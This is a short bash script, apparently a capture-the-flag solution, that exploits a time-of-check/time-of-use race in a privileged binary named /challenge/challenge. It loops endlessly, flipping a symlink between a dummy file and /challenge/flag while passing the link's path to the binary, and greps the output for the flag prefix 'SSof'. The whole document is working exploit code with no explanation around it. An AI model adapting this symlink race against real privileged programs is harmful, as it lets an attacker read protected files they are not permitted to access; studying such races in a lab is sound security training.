#! /bin/bash

loop() {
        while :
        do
                touch dummy
                ln -sf dummy pointer
                echo "/tmp/goncalo/pointer" | /challenge/challenge &
                ln -sf /challenge/flag pointer
        done
}

loop | grep "SSof"